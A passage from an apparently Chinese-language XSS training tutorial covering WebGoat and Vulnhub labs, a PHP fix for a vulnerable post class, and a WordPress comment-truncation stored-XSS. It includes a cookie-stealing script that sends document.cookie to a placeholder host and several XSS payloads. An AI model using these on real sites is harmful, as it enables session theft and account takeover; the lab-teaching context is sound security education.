                while(sum > 1){
                  unicodeBinary = unicodeBinary.concat(binaryArray.slice(i+2 , i+8));
                  i += 8;
                  --sum;
                }
                unicode = unicode.concat(_toDecimal(unicodeBinary));
                unicodeBinary = [];
              }
            }
            return unicode;
          }
      };
      window.BASE64 = __BASE64;
    })();
## 2.4 简易xss平台搭建
JS脚本
    var img = document.createElement("img");
    img.src = "http://xxx/x.php?cookie="+document.cookie;
    document.body.appendChild(img);
接收端
## 2.5 WebGoat 简介
WebGoat是OWASP组织研制出的用于进行web漏洞实验的Java靶场程序，用来说明web应用中存在的安全漏洞。WebGoat运行在带有java虚拟机的平台之上，当前提供的训练课程有30多个，其中包括：跨站点脚本攻击（XSS）、访问控制、线程安全、操作隐藏字段、操纵参数、弱会话cookie、SQL盲注、数字型SQL注入、字符串型SQL注入、web服务、Open
Authentication失效、危险的HTML注释等等。
## 2.5.1 WebGoat 安装
    https://github.com/WebGoat/WebGoat/releases/download/v8.0.0.M25/webgoat-server-8.0.0.M25.jar
    https://github.com/WebGoat/WebGoat/releases/download/v8.0.0.M25/webwolf-8.0.0.M25.jar
默认是127.0.0.1 ，只能本机访问，需要更改  
java -jar webgoat-server-8.0.0.M25.jar --server.address=0.0.0.0  
需更新到最新的java版本
    https://www.oracle.com/technetwork/java/javase/downloads/jdk12-downloads-5295953.html
安装java步骤省略，安装好了开始运行  
访问
## 2.5.2 测试过程
## 2.5.2.1 XSS(DOM)
## 第一个
攻击语句``  
## 第二个
去找js脚本看里面的内容。  
输入  
**start.mvc#test/**
## 第三个
结合上一个题的东西路径+基本参数构成  
攻击语句`start.mvc##test/alert(document.cookie)`,经过测试发现如果输入``
## 2.5.2.2 XSS(Stored)
攻击代码``，直接留言板插入即可没有过滤  
  1. 真实实战演练
## 3.1 Vulnhub 简介
Vulnhub是一个提供各种漏洞环境的靶场平台，供安全爱好者学习渗透使用，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用VMware或者VirtualBox运行。每个镜像会有破解的目标。
## 3.2 Vulnhub 安装
这里下载关于xss的(下载32位的，以后可以用来做溢出攻击)
    https://download.vulnhub.com/pentesterlab/xss_and_mysql_file_i386.iso
打开VMware经典模式挂上镜像一直下一步，选择桥接模式就能自动分配一个IP地址
安装成功
## 3.3 Vulnhub 漏洞介绍
本练习说明如何使用跨站点脚本漏洞来访问管理员的cookie。然后，您将如何使用他/她的会话来访问管理以查找SQL注入并使用它来获取代码执行。这个靶场主要是做一个xss反射  
用户名admin 密码P4ssw0rd
## 3.4 Vulnhub 漏洞演示
直接点留言  
成功，因为是真实环境，我们这里直接用xss平台搞  
管理员查看留言板触发xss  
即可成功冒充用户登录  
## 3.5 Vulnhub 漏洞修复
对输入处进行实例化，是最有效最简单的方法，如果是替换代码，量就比较大  
实例化classes/post.php
    title= $title;
        $this->text = $text;
        $this->published= $published;
        $this->id = $id;
      }   
      function all($cat=NULL,$order =NULL) {
        $sql = "SELECT * FROM posts";
        if (isset($order)) 
          $sql .= "order by ".mysql_real_escape_string($order);  
        $results= mysql_query($sql);
        $posts = Array();
        if ($results) {
          while ($row = mysql_fetch_assoc($results)) {
            $posts[] = new Post($row['id'],$row['title'],$row['text'],$row['published']);
          }
        }
        else {
          echo mysql_error();
        }
        return $posts;
      }
      function render_all($pics) {
        echo "\n";
        foreach ($pics as $pic) {
          echo "\t".$pic->render()."\n";
        }
        echo "\n";
      }
     function render_edit() {
        $str = "img)."\" alt=\"".h($this->title)."\" />";
        return $str;
      } 
      function render() {
        $str = "id)."\">".h($this->title)."";
        $str.= '';
        $str.= "".htmlentities($this->text)."";   
        $str.= "id)."\">";
        $count = $this->get_comments_count();
        switch ($count) {
        case 0:
            $str.= "Be the first to comment";
            break;
        case 1:
            $str.= "1 comment";
            break;
        case 2:
            $str.= $count." comments";
            break;
        }    
        $str.= "";
        return $str;
      }
      function add_comment() {
        $sql  = "INSERT INTO comments (title,author, text, post_id) values ('";
        $sql .= mysql_real_escape_string(htmlspecialchars($_POST["title"]))."','";
        $sql .= mysql_real_escape_string(htmlspecialchars($_POST["author"]))."','";
        $sql .= mysql_real_escape_string(htmlspecialchars($_POST["text"]))."',";
        $sql .= intval($this->id).")";
        $result = mysql_query($sql);
        echo mysql_error(); 
      } 
      function render_with_comments() {
        $str = "id)."\">".h($this->title)."";
        $str.= '';
        $str.= "".htmlentities($this->text)."";   
        $str.= "\n\nComments: \n";
        foreach ($this->get_comments() as $comment) {
          $str.= "\n\t".$comment->text."";
        }
        $str.= "\n";
        return $str;
      }
      function get_comments_count() {
        if (!preg_match('/^[0-9]+$/', $this->id)) {
          die("ERROR: INTEGER REQUIRED");
        }
        $comments = Array();
        $result = mysql_query("SELECT count(*) as count FROM comments where post_id=".$this->id);
        $row = mysql_fetch_assoc($result);
        return $row['count'];
      } 
      function get_comments() {
        if (!preg_match('/^[0-9]+$/', $this->id)) {
          die("ERROR: INTEGER REQUIRED");
        }
        $comments = Array();
        $results = mysql_query("SELECT * FROM comments where post_id=".$this->id);
        if (isset($results)){
          while ($row = mysql_fetch_assoc($results)) {
            $comments[] = Comment::from_row($row);
          }
        }
        return $comments;
      } 
      function find($id) {
        $result = mysql_query("SELECT * FROM posts where id=".$id);
        $row = mysql_fetch_assoc($result); 
        if (isset($row)){
          $post = new Post($row['id'],$row['title'],$row['text'],$row['published']);
        }
        return $post;
      }
      function delete($id) {
        if (!preg_match('/^[0-9]+$/', $id)) {
          die("ERROR: INTEGER REQUIRED");
        }
        $result = mysql_query("DELETE FROM posts where id=".(int)$id);
      }
      function update($title, $text) {
          $sql = "UPDATE posts SET title='";
          $sql .= mysql_real_escape_string(htmlspecialchars($_POST["title"]))."',text='";
          $sql .= mysql_real_escape_string(htmlspecialchars( $_POST["text"]))."' WHERE id=";
          $sql .= intval($this->id);
          $result = mysql_query($sql);
          $this->title = $title; 
          $this->text = $text; 
      } 
      function create(){
          $sql = "INSERT INTO posts (title, text) VALUES ('";
          $title = mysql_real_escape_string(htmlspecialchars( $_POST["title"]));
          $text = mysql_real_escape_string(htmlspecialchars( $_POST["text"]));
          $sql .= $title."','".$text;
          $sql.= "')";
          $result = mysql_query($sql);
      }
    }
    ?>
实例化成功  
# 4\. CMS实战演练
## 4.1 WordPress简介
WordPress于2003年开始使用一段代码来增强日常写作的印刷效果，用户数量少于您可以依靠手指和脚趾的数量。自那时起，它已成长为世界上最大的自主托管博客工具，在数百万个网站上使用，每天都有数千万人看到。
## 4.2 WordPress部署
下载4.1版本以下
    https://cn.wordpress.org/wordpress-4.0.1-zh_CN.zip
使用phpstudy搭建WordPress  
放到跟目录直接一把梭  
## 4.3 安装
先创建一个数据库`create database wordpress;`  
进行安装  
安装成功
## 4.4 WordPress漏洞介绍
漏洞出现在wordpress的留言处，不过问题是由mysql的一个特性引起的。在mysql的utf8字符集中，一个字符由1~3个字节组成，对于大于3个字节的字符，mysql使用了utf8mb4的形式来存储。如果我们将一个utf8mb4字符插入到utf8编码的列中，那么在mysql的非strict
mode下，他的做法是将后面的内容截断。截断的话，就能绕过很多富文本过滤器了。比如，插入两个评论`<img
src=1`，和`onerror=alert(1)//`，这二者都不会触发某些富文本过滤器（因为前者并不含有白名单外的属性，后者并不是一个标签），但两个评论如果存在于同一个页面，就会拼接成一个完整的HTML标签，触发onerror事件。
## 4.5 WordPress漏洞演示
先把Mysql的strict mode关闭  
my.ini
    将其中的 sql-mode="STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION"
    修改为 sql-mode="NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION"
攻击代码//P神博客的  
```  
<abbr title="qweqw
style=display:block;position:fixed;width:100%;height:100%;top:0;
onmouseover=alert(1)//